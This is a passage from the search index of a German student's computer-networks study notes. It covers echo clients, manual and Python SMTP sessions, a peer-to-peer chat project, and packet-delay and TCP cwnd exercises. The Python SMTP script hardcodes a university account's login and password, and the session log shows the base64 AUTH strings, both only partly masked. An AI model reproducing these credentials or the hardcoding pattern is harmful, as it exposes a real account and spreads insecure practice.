MESSAGE)\nsock.send(MESSAGE.encode('utf-8'))\n\ntry:\n    msg = sock.recv(1024).decode('utf-8')\n    print('Message received:', msg)\nexcept socket.timeout:\n    print('Socket timed out at', time.asctime())\n\nsock.close()\n</code></pre> Antwort (TCP): \u2705 Verbindung erfolgreich aufgebaut (3-way Handshake sichtbar im Mitschnitt). \u2705 Nachricht <code>\"Hello, World!\"</code> gesendet und identisch empfangen - der ECHO-Dienst auf TCP Port 7 funktioniert korrekt. \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Wireshark zeigt: <p></p> <ul> <li>SYN \u2192 SYN/ACK \u2192 ACK</li> <li>Datenpaket mit <code>\"Hello, World!\"</code></li> <li>R\u00fcckantwort mit derselben Nachricht</li> <li>FIN/ACK zum Verbindungsende</li> </ul> <p></p><pre><code># echo_udp_client.py\nimport socket\nimport time\n\nServer_IP = '141.37.168.26'\nServer_PORT = 7\nMESSAGE = 'Hello, World!'\n\nprint('Sending message', MESSAGE, 'to UDP server with IP', Server_IP, 'on Port =', Server_PORT)\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.settimeout(10)\nsock.sendto(MESSAGE.encode('utf-8'), (Server_IP, Server_PORT))\n\ntry:\n    data, addr = sock.recvfrom(1024)\n    print('Received message:', data.decode('utf-8'), 'from', addr)\nexcept socket.timeout:\n    print('Socket timed out at', time.asctime())\n\nsock.close()\n</code></pre> Antwort (UDP):<p></p> <p>\u2705 UDP-Paket an Port 7 wurde gesendet. \u2705 ECHO-Antwort korrekt empfangen: <code>\"Hello, World!\"</code> \u2192 UDP Port 7 ist ebenfalls offen und aktiv. \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Im WireShark-Mitschnitt siehst du: </p> <ul> <li>UDP-Paket vom Client zum Server</li> <li>UDP-Antwort mit demselben Payload vom Server</li> <li>Kein Verbindungsaufbau/Abbau notwendig (connectionless)</li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#5-smtp-in-windows-konsole","title":"5. SMTP in Windows-Konsole","text":"<p>Schritt f\u00fcr Schritt 1. verbinden \u00fcber cmd: <code>openssl s_client -starttls smtp -crlf -connect asmtp.htwg-konstanz.de:587</code></p> <ol> <li> <p>Einloggen mit Base64 encoded Login-Daten</p> </li> <li> <p>Struktur wie gefolgt in  die Konsole eingeben </p><pre><code>mail from:&lt;irgendeinname@beispiel.de&gt;\nrcpt to:&lt;DEINE_EMAIL@domain.de&gt;\ndata\nFrom: Fake Sender &lt;irgendeinname@beispiel.de&gt;\nTo: Du selbst &lt;DEINE_EMAIL@domain.de&gt;\nSubject: Test per OpenSSL\n\nHallo! Das ist eine Testmail \u00fcber SMTP via OpenSSL.\n\n.\n</code></pre><p></p> </li> </ol> <p></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#5-smtp-in-python","title":"5. SMTP in Python","text":"<pre><code>import socket\nimport ssl\nimport base64\nimport time\n\n\n\nuser=\"rxxxtin17@htwg-konstanz.de\"\npassword=\"eaN6ohdxxx\"\nrecipient=\"Nico.Roth@htwg-konstanz.de\"\nsender_name=\"Nico\"\nsubject=\"Testmail \u00fcber Python-SSL\"\nbody=\"Hey das ist eine Mail aus Python per SSL\"\nhost=\"smtp.htwg-konstanz.de\"\n\n\n\n# Base64-kodieren\nuser_b64 = base64.b64encode(user.encode()).decode()\npass_b64 = base64.b64encode(password.encode()).decode()\n\n\n\n# Verbindung \u00f6ffnen\ncontext = ssl.create_default_context()\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect((host, 587))\n\n# Plaintext-Kommunikation starten\ndef send(msg):\n\u00a0 \u00a0 print(\"--&gt;\", msg.strip())\n\u00a0 \u00a0 client_socket.send((msg + \"\\r\\n\").encode())\n\ndef recv():\n\u00a0 \u00a0 print(\"&lt;--\", client_socket.recv(1024).decode())\n\nrecv()\nsend(\"EHLO Nico\")\nrecv()\nsend(\"STARTTLS\")\nrecv()\n\n\n# SSL-Upgrade\nssl_socket = context.wrap_socket(client_socket, server_hostname=host) #TLS verschl\u00fcsselung aktivieren\ntime.sleep(1)\n\n# Authentifizieren und mail senden\ndef send_ssl(msg):\n\u00a0 \u00a0 print(\"\u2192\", msg.strip())\n\u00a0 \u00a0 ssl_socket.send((msg + \"\\r\\n\").encode())\n\ndef recv_ssl():\n\u00a0 \u00a0 print(\"\u2190\", ssl_socket.recv(1024).decode())\n\n\nsend_ssl(\"EHLO Nico\")\nrecv_ssl()\nsend_ssl(\"AUTH LOGIN\")\nrecv_ssl()\nsend_ssl(user_b64)\nrecv_ssl()\nsend_ssl(pass_b64)\nrecv_ssl()\nsend_ssl(f\"MAIL FROM:&lt;{user}&gt;\")\nrecv_ssl()\nsend_ssl(f\"RCPT TO:&lt;{recipient}&gt;\")\nrecv_ssl()\nsend_ssl(\"DATA\")\nrecv_ssl()\n\n\n# Hier wird die Nachricht gesendet\nsend_ssl(f\"\"\"From: {sender_name} &lt;{user}&gt;\nTo: {recipient}\nSubject: {subject}\n{body}\n.\"\"\")\n\nrecv_ssl()\nsend_ssl(\"QUIT\")\nrecv_ssl()\n</code></pre> <p>Wahrscheinlich Fehlermeldung wegen Norton weil Norton TLS Pakete abf\u00e4ngt und auf Viren \u00fcberpr\u00fcft bei dem das Originalzertifikat durch ein selbstsigniertes Zertifikat ersetzt wird. Aber bei meinem Team-Partner hat es funktioniert.</p> Auszug 1 - NicoAuszug 2 - Mohammed <pre><code>PS C:\\Users\\nico-\\Desktop\\uni\\Rechnernetze\\Socket Programmierung&gt;  c:; cd 'c:\\Users\\nico-\\Desktop\\uni\\Rechnernetze\\Socket Programmierung'; &amp; 'c:\\Users\\nico-\\AppData\\Local\\Programs\\Python\\Python313\\python.exe' 'c:\\Users\\nico-\\.vscode\\extensions\\ms-python.debugpy-2025.6.0-win32-x64\\bundled\\libs\\debugpy\\launcher' '64408' '--' 'c:\\Users\\nico-\\Desktop\\uni\\Rechnernetze\\Socket Programmierung\\smtp_mail_send.py' \n&lt;-- 220 mailgate3.htwg-konstanz.de ESMTP Postfix (Ubuntu)\n\n--&gt; EHLO Nico\n&lt;-- 250-mailgate3.htwg-konstanz.de\n250-PIPELINING\n250-SIZE 54525952\n250-ETRN\n250-STARTTLS\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250 SMTPUTF8\n\n--&gt; STARTTLS\n&lt;-- 220 2.0.0 Ready to start TLS\n\nTraceback (most recent call last):\n  File \"c:\\Users\\nico-\\Desktop\\uni\\Rechnernetze\\Socket Programmierung\\smtp_mail_send.py\", line 38, in &lt;module&gt;\n    ssl_socket = context.wrap_socket(client_socket, server_hostname=host) #TLS verschl\u00fcsselung aktivieren\n  File \"c:\\Users\\nico-\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\ssl.py\", line 455, in wrap_socket\n    return self.sslsocket_class._create(\n           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^\n        sock=sock,\n        ^^^^^^^^^^\n    ...&lt;5 lines&gt;...\n        session=session\n        ^^^^^^^^^^^^^^^\n    )\n    ^\n  File \"c:\\Users\\nico-\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\ssl.py\", line 1076, in _create\n    self.do_handshake()\n    ~~~~~~~~~~~~~~~~~^^\n  File \"c:\\Users\\nico-\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\ssl.py\", line 1372, in do_handshake\n    self._sslobj.do_handshake()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Basic Constraints of CA cert not marked critical (_ssl.c:1020)\n</code></pre> <pre><code>S C:\\Users\\mohsa\\Programming\\HTWG\\Rechnernetze&gt; py .\\mail_client.py\n&lt;-- 220 mailgate3.htwg-konstanz.de ESMTP Postfix (Ubuntu)\n\n--&gt; EHLO mohammed\n&lt;-- 250-mailgate3.htwg-konstanz.de\n250-PIPELINING\n250-SIZE 54525952\n250-ETRN\n250-STARTTLS\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n\n--&gt; STARTTLS\n&lt;-- 220 2.0.0 Ready to start TLS\n\n--&gt; EHLO mohammed\n&lt;-- 250-mailgate3.htwg-konstanz.de\n250-PIPELINING\n250-SIZE 54525952\n250-ETRN\n250-AUTH PLAIN LOGIN\n250-AUTH=PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n\n--&gt; AUTH LOGIN\n&lt;-- 334 VXNlcmxxx\n\n--&gt; cm5ldGluMTdAaHR3Zyxxx\n&lt;-- 334 UGFzc3dvcmQ6\n\n--&gt; ZWFONm9oZGxxxx\n&lt;-- 235 2.7.0 Authentication successful\n\n--&gt; MAIL FROM:xxx@htwg-konstanz.de\n&lt;-- 250 2.1.0 Ok\n\n--&gt; RCPT TO:Mohxxx@htwg-konstanz.de\n&lt;-- 250 2.1.5 Ok\n\n--&gt; DATA\n&lt;-- 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n\n--&gt; From: Mohammed xxx@htwg-konstanz.de\nTo: Mohxxxf@htwg-konstanz.de\nSubject: Testmail \u00fcber Python-SSL\n\nHey das ist eine Mail aus Python per SSL\n\n.\n&lt;-- 250 2.0.0 Ok: queued as 901D5100064\n\n--&gt; QUIT\n&lt;-- 221 2.0.0 Bye\n</code></pre>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/","title":"4. Peer To Peer - Projekt","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#1-server-als-zentrale-verwaltungseinheit","title":"1. Server als zentrale Verwaltungseinheit","text":"<p>Anforderung: Der Server dient als Adressverzeichnis. Clients registrieren sich mit Nickname und UDP-Port, um Peer-Verbindungen zu erm\u00f6glichen.</p> <p>Umsetzung:</p> <ul> <li> <p>Client sendet beim Verbinden: </p><pre><code>self.sock.sendall(build_message(\"REGISTER\", self.nickname.get(), str(self.udp_port)).encode())\n</code></pre><p></p> </li> <li> <p>Server speichert Nickname, IP und UDP-Port, verweigert doppelte Nicknames: </p><pre><code>if nickname in self.clients:\n    conn.sendall(build_message(\"ERROR\", \"Nickname bereits vergeben\").encode())\n</code></pre><p></p> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#2-broadcast-nachrichten-an-alle-teilnehmer","title":"2. Broadcast-Nachrichten an alle Teilnehmer","text":"<p>Anforderung: Nachrichten sollen \u00fcber den Server an alle verbundenen Clients verteilt werden.</p> <p>Umsetzung:</p> <ul> <li> <p>Client sendet <code>BROADCAST</code> an Server: </p><pre><code>self.sock.sendall(build_message(\"BROADCAST\", self.nickname.get(), message).encode())\n</code></pre><p></p> </li> <li> <p>Server verteilt Nachricht an alle anderen: </p><pre><code>for nick, (conn, _, _) in self.clients.items():\n    if nick != sender:\n        conn.sendall(build_message(\"BROADCAST_MSG\", sender, message).encode())\n</code></pre><p></p> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#3-anzeige-der-verbundenen-teilnehmer","title":"3. Anzeige der verbundenen Teilnehmer","text":"<p>Anforderung: Jeder Client soll sehen, welche Benutzer verbunden sind, inklusive IP &amp; UDP-Port.</p> <p>Umsetzung:</p> <ul> <li> <p>Server sendet <code>USERLIST</code>: </p><pre><code>def send_userlist_initial(self, conn):\n    entries = [f\"{n}:{ip}:{u}\" for n, (_, ip, u) in self.clients.items()]\n    conn.sendall(build_message(\"USERLIST\", *entries).encode())\n</code></pre><p></p> </li> <li> <p>Client zeigt Eintr\u00e4ge in einer <code>Listbox</code>: </p><pre><code>self.user_list.insert(tk.END, f\"{nick}:{ip}:{udp}\")\n</code></pre><p></p> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#4-aufbau-privater-chats-uber-udp-und-tcp","title":"4. Aufbau privater Chats \u00fcber UDP und TCP","text":"<p>Anforderung: Clients sollen private Direktverbindungen aufbauen k\u00f6nnen (Verbindungsaufbau \u00fcber UDP, Kommunikation \u00fcber TCP).</p> <p>Umsetzung:</p> <ul> <li> <p>Chat-Anfrage per UDP: </p><pre><code>s.sendto(f\"CHAT_REQUEST {tcp_port}\".encode(), (target_ip, target_udp_port))\n</code></pre><p></p> </li> <li> <p>Nach Annahme erfolgt TCP-Verbindung: </p><pre><code>conn.connect((ip, port))\nconn.sendall(self.nickname.get().encode())  # Sende eigenen Nickname\n</code></pre><p></p> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#5-verwaltung-paralleler-direktverbindungen","title":"5. Verwaltung paralleler Direktverbindungen","text":"<p>Anforderung: Mehrere Direktverbindungen sollen m\u00f6glich sein, aber gleiche Usernamen/IP-Port-Kombis d\u00fcrfen sich nicht doppelt verbinden.</p> <p>Umsetzung:</p> <ul> <li> <p>Serverseite: </p><pre><code>if nickname in self.clients:\n    # Verbindungsversuch mit vergebenem Nickname wird abgelehnt\n</code></pre><p></p> </li> <li> <p>Clientseite: </p><pre><code>if self.running:\n    self.log(\"[INFO] Bereits verbunden - mehrfaches Verbinden nicht erlaubt.\")\n</code></pre><p></p> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#6-trennung-privater-chats","title":"6. Trennung privater Chats","text":"<p>Anforderung: Wenn ein Chat-Partner das Fenster schlie\u00dft, soll der andere informiert werden.</p> <p>Umsetzung:</p> <ul> <li> <p>Beim Schlie\u00dfen wird eine spezielle Nachricht gesendet: </p><pre><code>conn.sendall(\"[DISCONNECT]\\n\".encode())\n</code></pre><p></p> </li> <li> <p>Empfangende Seite zeigt Hinweis: </p><pre><code>if decoded == \"[DISCONNECT]\":\n    log_chat(f\"[INFO] {peer_nickname} hat den Chat beendet.\")\n</code></pre><p></p> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#project-repository","title":"\ud83d\udd17 Project Repository","text":"<p>\ud83d\udc49 Click here to download or view the full source code on GitHub</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/4.%20Peer%20To%20Peer%20-%20Projekt/#beispielhafte-vorfuhrung","title":"Beispielhafte Vorf\u00fchrung","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/","title":"1. Paket\u00fcbertragung","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#ende-zu-ende-verzogerung","title":"Ende-zu-Ende-Verz\u00f6gerung","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#was-ist-das","title":"\ud83e\udde0 Was ist das?","text":"<p>Ende-zu-Ende-Verz\u00f6gerung ist die gesamte Zeit, die ein einzelnes Datenpaket ben\u00f6tigt, um vom Sender zum Empf\u00e4nger \u00fcber mehrere Netzwerk-Abschnitte (Links) zu reisen.</p> <p>Diese Verz\u00f6gerung setzt sich aus zwei Hauptteilen pro Link zusammen:</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#ubertragungsverzogerung-transmission-delay","title":"\ud83d\udd39 \u00dcbertragungsverz\u00f6gerung (Transmission Delay)","text":"<p>Zeit, um ein ganzes Paket \u201ein den Draht zu schieben\u201c (also zu \u00fcbertragen)     $$ t_\u00fc = \\frac{\\text{Paketgr\u00f6\u00dfe (in Bit)}}{\\text{\u00dcbertragungsrate (in Bit/s)}} $$</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#ausbreitungsverzogerung-propagation-delay","title":"\ud83d\udd39 Ausbreitungsverz\u00f6gerung (Propagation Delay)","text":"<p>Zeit, die ein Bit braucht, um \u00fcber die physikalische Strecke zu wandern  $$ t_a = \\frac{\\text{Strecke}}{\\text{Ausbreitungsgeschwindigkeit}} $$</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#ende-zu-ende-verzogerung-fur-mehrere-links","title":"\ud83d\udd39 Ende-zu-Ende-Verz\u00f6gerung (f\u00fcr mehrere Links)","text":"<p>Die Summe der Verz\u00f6gerungen \u00fcber alle Links hinweg:</p> \\[ t_{\\text{gesamt}} = \\sum_{i=1}^{n} (t_{\u00fc,i} + t_{a,i}) \\] <p>Oder f\u00fcr genau 3 Links:</p> \\[ t_{\\text{gesamt}} = (t_{\u00fc,1} + t_{a,1}) + (t_{\u00fc,2} + t_{a,2}) + (t_{\u00fc,3} + t_{a,3}) \\]","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#physikalische-lange-eines-pakets-im-kabel","title":"\ud83d\udd39 Physikalische L\u00e4nge eines Pakets im Kabel","text":"<p>Wie lang ein Paket \u201er\u00e4umlich\u201c ist, w\u00e4hrend es \u00fcber ein Medium l\u00e4uft: $$ \\text{L\u00e4nge}{\\text{phys}} = t{\u00fc} \\cdot v $$</p> <ul> <li>\\(t_{\u00fc}\\)\u200b = \u00dcbertragungsverz\u00f6gerung</li> <li>\\(v\\) = Ausbreitungsgeschwindigkeit</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#durchsatz-throughput","title":"\ud83d\udd39 Durchsatz (Throughput)","text":"<p>Effektive Datenmenge pro Sekunde, oft durch den langsamsten Link begrenzt:</p> <p>\\(Durchsatz=min\u2061(Link1,Link2,\u2026,Linkn)\\)</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#beispiel-direkt-aus-der-aufgabe","title":"\ud83d\udce6 Beispiel direkt aus der Aufgabe:","text":"Link \u00dcbertragungsrate L\u00e4nge Ausbreitungsgeschwindigkeit 1 60 Mbps 15 m 300\u202f000 km/s 2 25 Mbps 250 m 200\u202f000 km/s 3 20 Gbps 10\u202f000 m 250\u202f000 km/s <p>Paketgr\u00f6\u00dfe: 1500 Byte = <code>1500 \u00d7 8 = 12\u202f000 Bit</code></p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#berechne-die-verzogerungen11","title":"\ud83d\udd0d Berechne die Verz\u00f6gerungen:(1.1)","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#link-1","title":"\ud83d\udd39 Link 1","text":"\\[ t_{\u00fc1} = \\frac{12\\,000}{60\\,000\\,000} = 0{,}0002\\,\\text{s} = 0{,}2\\,\\text{ms} $$ $$ t_{a1} = \\frac{15}{300\\,000\\,000} = 5 \\cdot 10^{-8}\\,\\text{s} = 0{,}00005\\,\\text{ms} \\]","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#link-2","title":"\ud83d\udd39 Link 2","text":"\\[ t_{\u00fc2} = \\frac{12\\,000}{25\\,000\\,000} = 0{,}00048\\,\\text{s} = 0{,}48\\,\\text{ms} $$$$ t_{a2} = \\frac{250}{200\\,000\\,000} = 1{,}25 \\cdot 10^{-6}\\,\\text{s} = 0{,}00125\\,\\text{ms} \\]","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#link-3","title":"\ud83d\udd39 Link 3","text":"\\[ t_{\u00fc3} = \\frac{12\\,000}{20\\,000\\,000\\,000} = 6 \\cdot 10^{-7}\\,\\text{s} = 0{,}0006\\,\\text{ms} $$ $$ t_{a3} = \\frac{10\\,000}{250\\,000\\,000} = 4 \\cdot 10^{-5}\\,\\text{s} = 0{,}04\\,\\text{ms} \\]","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#gesamte-ende-zu-ende-verzogerung12","title":"\ud83d\udd1a Gesamte Ende-zu-Ende-Verz\u00f6gerung(1.2)","text":"\\[ t_{\\text{gesamt}} = (0{,}2 + 0{,}00005) + (0{,}48 + 0{,}00125) + (0{,}0006 + 0{,}04) = 0{,}7219\\,\\text{ms} \\] <p>Die Ende-zu-Ende-Verz\u00f6gerung betr\u00e4gt 0,7219 ms.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#hangt-das-von-der-reihenfolge-der-links-ab12","title":"\ud83d\udd01 H\u00e4ngt das von der Reihenfolge der Links ab?(1.2)","text":"<p>Nein. Bei einem Paket ist die Reihenfolge nicht relevant. Bei mehreren Paketen ist es abh\u00e4ngig weil es definiert wo es anf\u00e4ngt sich zu stauen, aber bei  Zeit von Sender bis Empf\u00e4nger reicht schon ein einziger Link der langsamer ist um die gesamte \u00dcbertragung zu verz\u00f6gern</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#paket-burst-reihenfolge","title":"Paket-Burst &amp; Reihenfolge","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#20-pakete-direkt-nacheinander-packet-burst","title":"\ud83d\udce6 20 Pakete direkt nacheinander (Packet Burst)","text":"<p>Frage: Wie lange dauert die \u00dcbertragung von 20 Paketen, wenn du sie direkt hintereinander losschickst?</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#idee","title":"\ud83e\udde0 Idee:","text":"<p>Nur das erste Paket muss die ganze Ende-zu-Ende-Verz\u00f6gerung durchlaufen. Die anderen 19 kommen nach und nach hinterher - mit einem Abstand entsprechend der langsamsten \u00dcbertragungsverz\u00f6gerung.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#relevant-ist","title":"\ud83d\udd0d Relevant ist:","text":"<p>Welcher Link ist der langsamste beim \u201eReinschieben\u201c? \u2192 Das ist Link 2: 25 Mbps</p> \\[ t_{\u00fc,\\text{max}} = \\frac{12\\,000}{25\\,000\\,000} = 0{,}00048 \\, \\text{s} = 0{,}48\\,\\text{ms} \\]","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#gesamtzeit-fur-20-pakete","title":"\ud83d\udcd0 Gesamtzeit f\u00fcr 20 Pakete:","text":"Was? Warum? t\u00fcmax = max. \u00dcbertragungsverz\u00f6gerung auf einem Link Weil der langsamste Link bestimmt, wie schnell du neue Pakete senden kannst Bitrate immer in Bit/s Mbps = \"Mega bit per second\" = \\(\u00d710^6\\) Paketgr\u00f6\u00dfe in Bit umrechnen 1 Byte = 8 Bit Gesamtzeit bei Bursts: t-gesamt $$ t_{\\text{gesamt}} = t_{\\text{e2e}} + (N - 1) \\cdot t_{\u00fc,\\text{max}} $$ $$ t_{\\text{gesamt}} = 0{,}7219 + 19 \\cdot 0{,}48 = 0{,}7219 + 9{,}12 = 9{,}8419\\,\\text{ms} $$ <p>\u2705 Antwort Aufgabe 1.3: Gesamt\u00fcbertragungsdauer f\u00fcr den Burst = 9,84 ms</p> <p>\ud83d\udd01 H\u00e4ngt das auch von der Reihenfolge der Links ab?</p> <p>Ja, noch st\u00e4rker als bei einem einzelnen Paket. Denn: Der erste (langsamste) Link bestimmt, wie schnell du weitere Pakete nachschieben kannst.</p>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/1.%20Paket%C3%BCbertragung/#durchsatz-und-paketverlustklausuraufgabe","title":"Durchsatz und Paketverlust(Klausuraufgabe)","text":"<p>4)</p> <p>600 Byte = 4800 Bit 1,20 Mbps = 1.200.000 Bit/s</p> \\[ {t}_{\\text{tx}} = \\frac{4800 \\text{ Bit}}{1.200.000 \\text{ Bit/s}} = 0{,}004\\,\\text{s} = 4{,}0\\,\\text{ms} \\] Zeit (ms) Gr\u00f6\u00dfe (B) Verz\u00f6gerung (ms) 0.0 900 6 2.0 600 4 3.0 900 6 4.0 900 6 5.0 900 6 7.0 1200 8 9.0 900 6 24.0 1200 8 26.0 1200 8 27.0 1200 8 Zeit Ereignis Gr\u00f6\u00dfe / Verz\u00f6gerung Blockiert Puffer (Pakete) \u00dcbertragungsende 0 A 900 / 6 Nein - 6 2 A 600 / 4 Nein [600] 3 A 900 / 6 Nein [600, 900] 4 A 900 / 6 Nein [600, 900, 900] 5 A 900 / 6 Ja [600, 900, 900] \u274c verloren 6 D - [900, 900] n\u00e4chste Ende: 10 7 A 1200 / 8 Nein [900, 900, 1200] 9 A 900 / 6 Ja [900, 900, 1200] \u274c verloren 10 D - [900, 1200] n\u00e4chste Ende: 16 16 D - [1200] n\u00e4chste Ende: 24 24 A 1200 / 8 Nein [1200, 1200] Ende: 32 26 A 1200 / 8 Nein [1200, 1200, 1200] 27 A 1200 / 8 Ja [1200,1200,1200] \u274c verloren","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/","title":"2. Page Load Times","text":"","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#1-was-ist-cwnd","title":"\ud83e\udde0 1. Was ist <code>cwnd</code>?","text":"<ul> <li><code>cwnd</code> (Congestion Window) ist ein interner Wert beim Sender von TCP-Daten (z.\u202fB. Webserver)</li> <li>Er regelt, wie viele Bytes (bzw. Segmente) TCP auf einmal ins Netzwerk senden darf, ohne auf Best\u00e4tigungen (ACKs) zu warten.</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#warum-gibt-es-cwnd","title":"Warum gibt es <code>cwnd</code>?","text":"<p>Damit der Sender nicht zu viele Daten auf einmal losschickt und dadurch das Netzwerk \u00fcberlastet.</p> <ul> <li>TCP wei\u00df nicht, wo im Netz es gerade klemmt (Router, Leitungen, etc.)</li> <li> <p>Aber es merkt:</p> <ul> <li>\ud83d\udcc9 Wenn ACKs langsam oder gar nicht zur\u00fcckkommen \u2192 \u26a0\ufe0f Stau \u2192 <code>cwnd</code> wird kleiner</li> <li>\ud83d\udcc8 Wenn ACKs schnell und vollst\u00e4ndig zur\u00fcckkommen \u2192 \ud83d\udfe2 alles gut \u2192 <code>cwnd</code> wird gr\u00f6\u00dfer</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#cwnd-wachst-bei","title":"cwnd w\u00e4chst bei:","text":"<ul> <li>ACKs, die zur\u00fcckkommen</li> <li>Je mehr ACKs, desto gr\u00f6\u00dfer <code>cwnd</code> \u2192 erlaubt mehr gleichzeitige Sendungen</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#cwnd-schrumpft-bei","title":"cwnd schrumpft bei:","text":"<ul> <li>Paketverlust oder Timeout</li> <li>TCP wird vorsichtiger \u2192 reduziert <code>cwnd</code></li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#2-was-ist-iw-initial-window","title":"\ud83d\udd22 2. Was ist <code>IW</code> (Initial Window)?","text":"<ul> <li>Das ist der Startwert von <code>cwnd</code>, wenn eine neue Verbindung aufgebaut wird.</li> <li>Beispiel: <code>IW = 2 MSS</code> \u2192 TCP darf direkt zu Beginn 2 Segmente senden (z.\u202fB. 1600 Bytes bei MSS = 800 Bytes)</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#3-was-ist-rtt-round-trip-time","title":"\ud83d\udd01 3. Was ist RTT (Round-Trip Time)?","text":"<ul> <li>Die Zeit, die vergeht, bis ein gesendetes Paket beantwortet wird.</li> <li>Also:<ul> <li>\ud83d\udce4 Ein Paket geht raus</li> <li>\ud83d\udce5 Eine Antwort (z.\u202fB. ACK oder Daten) kommt zur\u00fcck     \u2192 Das ist eine RTT</li> </ul> </li> </ul> <p>Beispiel:</p> <ul> <li>Client schickt HTTP-Request an Server</li> <li>Server schickt erste Antwort (z.\u202fB. ein Segment)     \u2192 Das Ganze z\u00e4hlt als 1 RTT</li> </ul>","tags":["Course/"]},{"location":"studium/Rechnernetze/Theoretisch/2.%20Page%20Load%20Times/#4-was-sind-acks","title":"\ud83d\udcec 4. Was sind ACKs?","text":"<ul> <li>Das sind kleine Nachrichten vom Empf\u00e4nger an den Sender, die sagen:     &gt; \u201eIch habe dein Paket bekommen.\u201c</li> </ul> <p>TCP wartet auf diese ACKs, um:</p> <ul> <li>zu wissen, was angekommen ist</li> <li>zu entscheiden, ob <code>cwnd</code> erh\u00f6ht werden darf</li> </ul> <p>Ohne ACKs \u2192 kein Wachstum von 